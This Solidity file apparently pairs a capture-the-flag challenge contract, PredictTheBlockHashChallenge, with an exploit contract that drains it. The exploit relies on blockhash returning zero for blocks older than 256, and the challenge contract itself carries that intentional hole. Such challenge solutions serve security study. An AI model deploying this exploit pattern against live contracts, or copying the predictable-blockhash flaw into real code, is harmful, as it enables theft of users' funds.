pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheBlockHashExploit {
    PredictTheBlockHashChallenge _target;
    bytes32 guess = 0x0000000000000000000000000000000000000000000000000000000000000000;
    uint256 guessBlock;

    function PredictTheBlockHashExploit(address _targetAddress) public payable {
        require(msg.value == 1 ether);
        _target = PredictTheBlockHashChallenge(_targetAddress);
        _target.lockInGuess.value(msg.value)(guess);
        guessBlock = block.number + 1;
    }

    function settle() public {
        require(guess == block.blockhash(guessBlock));

        _target.settle();

        require(_target.isComplete());

        selfdestruct(msg.sender);
    }

    function() public payable {}
}
